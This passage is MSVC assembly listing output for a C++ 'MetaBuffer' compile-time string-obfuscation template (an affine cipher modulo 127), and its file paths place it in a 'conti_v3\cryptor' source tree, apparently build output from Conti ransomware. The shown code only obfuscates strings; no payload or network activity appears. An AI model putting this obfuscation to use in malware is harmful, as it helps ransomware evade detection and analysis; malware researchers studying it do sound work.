  0017b	88 41 08	 mov	 BYTE PTR [rcx+8], al
  0017e	b8 01 00 00 00	 mov	 eax, 1
  00183	48 6b c0 08	 imul	 rax, rax, 8
  00187	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0018e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00192	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00199	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  0019e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001a5	88 41 09	 mov	 BYTE PTR [rcx+9], al
  001a8	b8 01 00 00 00	 mov	 eax, 1
  001ad	48 6b c0 09	 imul	 rax, rax, 9
  001b1	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001b8	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001bc	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001c3	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  001c8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001cf	88 41 0a	 mov	 BYTE PTR [rcx+10], al
  001d2	b8 01 00 00 00	 mov	 eax, 1
  001d7	48 6b c0 0a	 imul	 rax, rax, 10
  001db	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  001e2	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  001e6	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001ed	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  001f2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  001f9	88 41 0b	 mov	 BYTE PTR [rcx+11], al
  001fc	b8 01 00 00 00	 mov	 eax, 1
  00201	48 6b c0 0b	 imul	 rax, rax, 11
  00205	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0020c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00210	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00217	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  0021c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00223	88 41 0c	 mov	 BYTE PTR [rcx+12], al
  00226	b8 01 00 00 00	 mov	 eax, 1
  0022b	48 6b c0 0c	 imul	 rax, rax, 12
  0022f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00236	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0023a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00241	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  00246	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0024d	88 41 0d	 mov	 BYTE PTR [rcx+13], al
  00250	b8 01 00 00 00	 mov	 eax, 1
  00255	48 6b c0 0d	 imul	 rax, rax, 13
  00259	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00260	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00264	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0026b	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  00270	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00277	88 41 0e	 mov	 BYTE PTR [rcx+14], al
  0027a	b8 01 00 00 00	 mov	 eax, 1
  0027f	48 6b c0 0e	 imul	 rax, rax, 14
  00283	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0028a	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0028e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00295	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  0029a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002a1	88 41 0f	 mov	 BYTE PTR [rcx+15], al
  002a4	b8 01 00 00 00	 mov	 eax, 1
  002a9	48 6b c0 0f	 imul	 rax, rax, 15
  002ad	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002b4	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002b8	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002bf	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  002c4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002cb	88 41 10	 mov	 BYTE PTR [rcx+16], al
  002ce	b8 01 00 00 00	 mov	 eax, 1
  002d3	48 6b c0 10	 imul	 rax, rax, 16
  002d7	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  002de	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  002e2	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002e9	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  002ee	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  002f5	88 41 11	 mov	 BYTE PTR [rcx+17], al
  002f8	b8 01 00 00 00	 mov	 eax, 1
  002fd	48 6b c0 11	 imul	 rax, rax, 17
  00301	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00308	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0030c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00313	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  00318	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0031f	88 41 12	 mov	 BYTE PTR [rcx+18], al
  00322	b8 01 00 00 00	 mov	 eax, 1
  00327	48 6b c0 12	 imul	 rax, rax, 18
  0032b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00332	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00336	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0033d	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  00342	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00349	88 41 13	 mov	 BYTE PTR [rcx+19], al
  0034c	b8 01 00 00 00	 mov	 eax, 1
  00351	48 6b c0 13	 imul	 rax, rax, 19
  00355	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0035c	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00360	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00367	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  0036c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00373	88 41 14	 mov	 BYTE PTR [rcx+20], al
  00376	b8 01 00 00 00	 mov	 eax, 1
  0037b	48 6b c0 14	 imul	 rax, rax, 20
  0037f	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00386	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0038a	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00391	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  00396	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0039d	88 41 15	 mov	 BYTE PTR [rcx+21], al
  003a0	b8 01 00 00 00	 mov	 eax, 1
  003a5	48 6b c0 15	 imul	 rax, rax, 21
  003a9	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  003b0	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  003b4	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003bb	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@AEBAEE@Z ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::encrypt
  003c0	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  003c7	88 41 16	 mov	 BYTE PTR [rcx+22], al
  003ca	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  003d1	0f b6 40 01	 movzx	 eax, BYTE PTR [rax+1]
  003d5	88 85 c0 00 00
	00		 mov	 BYTE PTR tv252[rbp], al

; 52   :     {
; 53   : 
; 54   :     }

  003db	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  003e2	48 8d a5 d8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+216]
  003e9	5f		 pop	 rdi
  003ea	5d		 pop	 rbp
  003eb	c3		 ret	 0
??0?$MetaBuffer@$04$0L@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08$09$0L@$0M@$0N@$0O@$0P@$0BA@$0BB@$0BC@$0BD@$0BE@$0BF@@std@@@@QEAA@PEBE@Z ENDP ; MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >::MetaBuffer<5,11,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21> >
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?decrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 79   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	83 e8 48	 sub	 eax, 72			; 00000048H
  0002d	6b c0 d9	 imul	 eax, eax, -39		; ffffffffffffffd9H
  00030	ba 7f 00 00 00	 mov	 edx, 127		; 0000007fH
  00035	8b c8		 mov	 ecx, eax
  00037	e8 00 00 00 00	 call	 ?positive_modulo@@YAHHH@Z ; positive_modulo

; 81   :     }

  0003c	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00043	5f		 pop	 rdi
  00044	5d		 pop	 rbp
  00045	c3		 ret	 0
?decrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?encrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z
_TEXT	SEGMENT
this$ = 224
byte$ = 232
?encrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z PROC ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt, COMDAT

; 74   :     {

$LN3:
  00000	88 54 24 10	 mov	 BYTE PTR [rsp+16], dl
  00004	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00009	55		 push	 rbp
  0000a	57		 push	 rdi
  0000b	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  00012	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00017	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001e	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 75   :         return (A * byte + B) % 127;

  00023	0f b6 85 e8 00
	00 00		 movzx	 eax, BYTE PTR byte$[rbp]
  0002a	6b c0 0d	 imul	 eax, eax, 13
  0002d	83 c0 48	 add	 eax, 72			; 00000048H
  00030	99		 cdq
  00031	b9 7f 00 00 00	 mov	 ecx, 127		; 0000007fH
  00036	f7 f9		 idiv	 ecx
  00038	8b c2		 mov	 eax, edx

; 76   :     }

  0003a	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00041	5f		 pop	 rdi
  00042	5d		 pop	 rbp
  00043	c3		 ret	 0
?encrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ENDP ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?decrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ
_TEXT	SEGMENT
i$1 = 8
this$ = 256
?decrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ PROC ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt, COMDAT

; 62   :     {

$LN7:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec 08 01
	00 00		 sub	 rsp, 264		; 00000108H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 63   :         if (!isDecrypted())

  0001f	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00026	e8 00 00 00 00	 call	 ?isDecrypted@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
  0002b	0f b6 c0	 movzx	 eax, al
  0002e	85 c0		 test	 eax, eax
  00030	75 53		 jne	 SHORT $LN5@decrypt

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  00032	48 c7 45 08 00
	00 00 00	 mov	 QWORD PTR i$1[rbp], 0
  0003a	eb 0b		 jmp	 SHORT $LN4@decrypt
$LN2@decrypt:
  0003c	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00040	48 ff c0	 inc	 rax
  00043	48 89 45 08	 mov	 QWORD PTR i$1[rbp], rax
$LN4@decrypt:
  00047	48 83 7d 08 0a	 cmp	 QWORD PTR i$1[rbp], 10
  0004c	73 37		 jae	 SHORT $LN3@decrypt

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  0004e	48 8b 45 08	 mov	 rax, QWORD PTR i$1[rbp]
  00052	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00059	48 03 c8	 add	 rcx, rax
  0005c	48 8b c1	 mov	 rax, rcx
  0005f	0f b6 50 01	 movzx	 edx, BYTE PTR [rax+1]
  00063	48 8b 8d 00 01
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0006a	e8 00 00 00 00	 call	 ?decrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
  0006f	48 8b 4d 08	 mov	 rcx, QWORD PTR i$1[rbp]
  00073	48 8b 95 00 01
	00 00		 mov	 rdx, QWORD PTR this$[rbp]
  0007a	48 03 d1	 add	 rdx, rcx
  0007d	48 8b ca	 mov	 rcx, rdx
  00080	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00083	eb b7		 jmp	 SHORT $LN2@decrypt
$LN3@decrypt:
$LN5@decrypt:

; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;

  00085	48 8b 85 00 01
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0008c	48 ff c0	 inc	 rax

; 70   :     }

  0008f	48 8d a5 e8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+232]
  00096	5f		 pop	 rdi
  00097	5d		 pop	 rbp
  00098	c3		 ret	 0
?decrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAAPEBDXZ ENDP ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::decrypt
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ?isDecrypted@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 224
?isDecrypted@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ PROC ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted, COMDAT

; 57   :     {

$LN3:
  00000	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  00005	55		 push	 rbp
  00006	57		 push	 rdi
  00007	48 81 ec e8 00
	00 00		 sub	 rsp, 232		; 000000e8H
  0000e	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00013	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001a	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 58   :         return m_isDecrypted;

  0001f	48 8b 85 e0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  00026	0f b6 00	 movzx	 eax, BYTE PTR [rax]

; 59   :     }

  00029	48 8d a5 c8 00
	00 00		 lea	 rsp, QWORD PTR [rbp+200]
  00030	5f		 pop	 rdi
  00031	5d		 pop	 rbp
  00032	c3		 ret	 0
?isDecrypted@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEBA_NXZ ENDP ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::isDecrypted
_TEXT	ENDS
; Function compile flags: /Odtp /RTCsu /ZI
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
;	COMDAT ??0?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z
_TEXT	SEGMENT
tv168 = 192
this$ = 240
data$ = 248
??0?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@QEAA@PEBE@Z PROC ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >, COMDAT

; 50   :     constexpr __forceinline MetaBuffer(const unsigned char* data)

$LN3:
  00000	48 89 54 24 10	 mov	 QWORD PTR [rsp+16], rdx
  00005	48 89 4c 24 08	 mov	 QWORD PTR [rsp+8], rcx
  0000a	55		 push	 rbp
  0000b	57		 push	 rdi
  0000c	48 81 ec f8 00
	00 00		 sub	 rsp, 248		; 000000f8H
  00013	48 8d 6c 24 20	 lea	 rbp, QWORD PTR [rsp+32]
  00018	48 8d 0d 00 00
	00 00		 lea	 rcx, OFFSET FLAT:__722C6D77_MetaString@h
  0001f	e8 00 00 00 00	 call	 __CheckForDebuggerJustMyCode

; 55   : 
; 56   :     inline bool isDecrypted() const
; 57   :     {
; 58   :         return m_isDecrypted;
; 59   :     }
; 60   : 
; 61   :     inline const char* decrypt()
; 62   :     {
; 63   :         if (!isDecrypted())
; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)
; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);
; 67   :         }
; 68   : 
; 69   :         return (const char*)m_buffer;
; 70   :     }
; 71   : 
; 72   : private:
; 73   :     constexpr unsigned char __forceinline encrypt(unsigned char byte) const
; 74   :     {
; 75   :         return (A * byte + B) % 127;
; 76   :     }
; 77   : 
; 78   :     constexpr unsigned char __forceinline decrypt(unsigned char byte) const
; 79   :     {
; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);
; 81   :     }
; 82   : 
; 83   :     volatile bool m_isDecrypted = false;

  00024	48 8b 85 f0 00
	00 00		 mov	 rax, QWORD PTR this$[rbp]
  0002b	c6 00 00	 mov	 BYTE PTR [rax], 0

; 51   :         : m_buffer{ encrypt(data[Ints])... }

  0002e	b8 01 00 00 00	 mov	 eax, 1
  00033	48 6b c0 00	 imul	 rax, rax, 0
  00037	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  0003e	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00042	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00049	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  0004e	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00055	88 41 01	 mov	 BYTE PTR [rcx+1], al
  00058	b8 01 00 00 00	 mov	 eax, 1
  0005d	48 6b c0 01	 imul	 rax, rax, 1
  00061	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00068	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  0006c	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  00073	e8 00 00 00 00	 call	 ?encrypt@?$MetaBuffer@$0N@$0EI@U?$integer_sequence@_K$0A@$00$01$02$03$04$05$06$07$08@std@@@@AEBAEE@Z ; MetaBuffer<13,72,std::integer_sequence<unsigned __int64,0,1,2,3,4,5,6,7,8,9> >::encrypt
  00078	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
  0007f	88 41 02	 mov	 BYTE PTR [rcx+2], al
  00082	b8 01 00 00 00	 mov	 eax, 1
  00087	48 6b c0 02	 imul	 rax, rax, 2
  0008b	48 8b 8d f8 00
	00 00		 mov	 rcx, QWORD PTR data$[rbp]
  00092	0f b6 14 01	 movzx	 edx, BYTE PTR [rcx+rax]
  00096	48 8b 8d f0 00
	00 00		 mov	 rcx, QWORD PTR this$[rbp]
